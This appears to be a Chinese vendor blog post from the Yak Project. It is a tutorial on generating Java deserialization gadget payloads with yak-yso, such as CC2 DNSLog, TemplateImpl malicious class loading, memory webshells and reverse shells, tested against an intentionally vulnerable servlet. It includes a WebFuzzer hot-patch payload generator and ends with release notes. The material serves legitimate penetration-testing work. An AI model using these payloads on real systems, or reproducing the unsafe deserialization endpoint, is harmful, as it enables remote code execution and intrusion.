#  实战分享：用Yak-yso解决一些常见问题   
原创 Q16G  Yak Project   2024-07-05 17:31  
  
![](/articles/wechat2md-57d4b38fb5fac67b077017855ed50c43.gif)  
  
![](/articles/wechat2md-745a416755959ee18783119465b62896.jpeg)  
  
![](/articles/wechat2md-bb809a5b07aaa14d67aa9464ac9778cc.png)  
  
![](/articles/wechat2md-411aa97907db89f37dc1bb75d15f5690.png)  
![](/articles/wechat2md-e68fa6680255f3e874a3734616fceeeb.png)  
  
有同学常常使用yak-yso  
生成的时候，不关注java版本而使用了默认的（默认52  
也就是JDK1.8），会导致有些情况下，某些链子打不通的情况。（原因是：当版本进行升级的时候，有些内置函数、方法、接口都会做出改变）  
  
  
![](/articles/wechat2md-ce2201e6bb465e89a94d933943830f34.png)  
  
  
  
![](/articles/wechat2md-90238dcf9bbca5ac713633a8e479d9e3.png)  
![](/articles/wechat2md-22d138f36c4ce22aa8d876098fceb88b.png)  
  
  
yak-yso中内置了两种模式的反序列化链(漏洞点为反序列化的漏洞。以shiro为例)  
和 恶意类加载(漏洞点为类加载的漏洞。这里就以fastjson为例)  
   
。  
> 而yak-yso还可以yak中的反连平台  
、webFuzzer  
进行同步使用  
  
  
  
下面就用一个小的靶场demo来进行简单说明  
  
  
  
![](/articles/wechat2md-36dad18c85659d1009f470e2b5c85e08.png)  

#### 测试环境  

（1）启动tomcat
（2）导入maven（需要导入cc依赖）

    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.0</version>
    </dependency>

（3）编写一个入口，如下 大致的意思为 request body的内容进行反序列化

    package com.example.Controller;
    
    import javax.servlet.*;
    import javax.servlet.http.*;
    import javax.servlet.annotation.*;
    import java.io.IOException;
    import java.io.ObjectInputStream;
    
    @WebServlet(name = "HelloServlet", value = "/api/HelloServlet")
    public class HelloServlet extends HttpServlet {
        @Override
        protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            ObjectInputStream objectInputStream = new ObjectInputStream(request.getInputStream());
            try {
                objectInputStream.readObject();
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            } finally {
                objectInputStream.close();
            }
        }
    
        @Override
        protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
            response.getWriter().write("hello");
        }
    }

#### Yak-yso-attack  
  
##### 具体使用：  
  
这里就以urldns  
为例，使用yak-yso  
生成cc2-dnslog，我们可以配合yak中内置的dnslog来进行测试。我们发送数据包就可以成功进行复现。如图  
  
  
![](/articles/wechat2md-2a0714f68574639eac77d694e179376a.png)  
  
  
![](/articles/wechat2md-aac3ec3603d73c76e89be3da42da27f6.png)  
> 这里不仅限于使用dnslog，还可以启动反连服务器来进行漏洞验证。  
  
  
#####   
##### 内存加载恶意类  
  
  
我们可以通过TemplateImplClassloader  
来进行类的内存加载，我们可以通过yak-yso不使用调用链的模式来生成恶意类，然后通过反序列化链进行加载，同时我们也可以生成通过类加载来注入内存马。  
> 当进行类加载的时候，java  
默认同一类加载一次，而yak-yso  
生成时候是同名的，所以有可能会出现二次加载不成功的问题，所以，类加载的时候要时刻注意名称的问题。  
  
  
  
我们这里以加载恶意类为例，可以用yso  
来生成恶意类，以RuntimeExec为例，输出为base64  
  
  
![](/articles/wechat2md-ecb90066e01ffcacc0126f5ab8a1abda.png)  
  
我们在选择利用链，使用cc2-->TemplateImplClassLoader  
 将base64恶意类填入生成hex  
然后发包即可。  
  
##### 和webfuzzer进行联动  
  
上面每次发送都需要  生成-->填入参数-->.....  
 每次都需要经历重复性的操作，是非常繁琐的。可以使用web-fuzzer的热加载来完成。  
> 热加载文档(https://yaklang.io/products/Web%20Fuzzer/fuzz-hotpatch)  
  
  
  
我们只需要在热加载中用yak语言来进行编写代码即可。  
> 当返回是一个数组的时候， Web Fuzzer 会将数组中的每一个元素都作为值去发包。所以要转成hex然后再进行解码  
  
  
  
  
![](/articles/wechat2md-3720deb7be979b813b3d5c85dc4ec93f.png)  
```
handle = func(domain) {    gadgetObj = yso.GetGadget("CommonsCollections2",yso.useTemplate("DNSLog"),yso.obfuscationClassConstantPool(),yso.evilClassName("AaZszFvX"),yso.majorVersion(52),yso.useClassParam("domain",domain))~gadgetBytes = yso.ToBytes(gadgetObj,yso.dirtyDataLength(0))~return codec.EncodeToHex(gadgetBytes)}
handle = func(domain) {
    gadgetObj = yso.GetGadget("CommonsCollections2",yso.useTemplate("DNSLog"),yso.obfuscationClassConstantPool(),yso.evilClassName("AaZszFvX"),yso.majorVersion(52),yso.useClassParam("domain",domain))~
gadgetBytes = yso.ToBytes(gadgetObj,yso.dirtyDataLength(0))~
return codec.EncodeToHex(gadgetBytes)
}
```  
  
![](/articles/wechat2md-8db572706c6c0baccb9ef3efbb24bca6.png)  
- shiro漏洞修改max-header(使用yak-yso中ModifyTomcatMaxHeaderSize  
来填入要修改header头的大小来进行修改)  
  
- 反弹shell（yak-yso中tcp-reverse）  
  
- 命令执行  
  
  
  
  
  
  
**END**  
  
  
 **更新记录**  
  
**Yaklang 1.3.4-beta7**  
  
  
在此版本中，我们引入了多项增强功能和重要修复，提升了系统的稳定性和性能，同时扩展了一些关键功能。以下是本次发布的主要亮点：  
  
  
**新特性**  
  
- SyntaxFlow 增强：新增 `alert-for` 语句，以及支持严格模式的选项，增强了 SyntaxFlow 的表达能力，新增了 ... 运算符可以自动寻找链式调用，同时修复了若干 SyntaxFlow 的 Bug  
  
- 泛型函数支持：增加了对泛型函数的支持，允许在使用库函数时应用泛型类型。  
  
- WebSocket 改进：对 WebSocket 进行了优化，增加了压缩处理和消息处理的严格模式。  
  
- YAK URL 文件监控：引入 YAK URL 文件监控功能，增强了文件状态的监控能力。  
  
- 新增 CLI 命令：create-syntax flow csf**：为创建 SyntaxFlow 配置文件增加了新的 CLI 命令，提高了用户交互效率。  
  
  
**性能优化**  
  
- 数据库操作优化：改进了数据库操作时的频率控制逻辑，确保在高频操作场景下数据库的稳定性。  
  
- 镜像处理优化：修复了 MITM 镜像处理中的并发问题，现在镜像操作将以协程方式运行，提高了处理效率。  
  
  
**修复**  
  
- SSA 分析修复：修复了静态安全分析中的若干问题，包括泛型函数处理错误和类型比较错误。  
  
- HTTP 模板修复：解决了 HTTP 模板中脚本名称和 UUID 添加错误的问题。  
  
- 低级 HTTP 处理：优化并修复了低级 HTTP 处理中的数据截断和字符集识别的一个特殊问题，提升了识别精准度。  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
https://yaklang.com/docs/intro/Yakit 视频教程：  
https://space.bilibili.com/437503777Github下载地址：  
https://github.com/yaklang/yakitYakit官网下载地址：  
https://yaklang.com/Yakit安装文档：  
https://yaklang.com/products/download_and_installYakit使用文档：  
https://yaklang.com/products/intro/常见问题速查：  
https://yaklang.com/products/FAQ  
  
![](/articles/wechat2md-6eb00bc28fd5af728c4ba61a04026b5b.png)  
  
![](/articles/wechat2md-304b45488320344b4c7cdbd5759ee4e8.gif)  
  
  
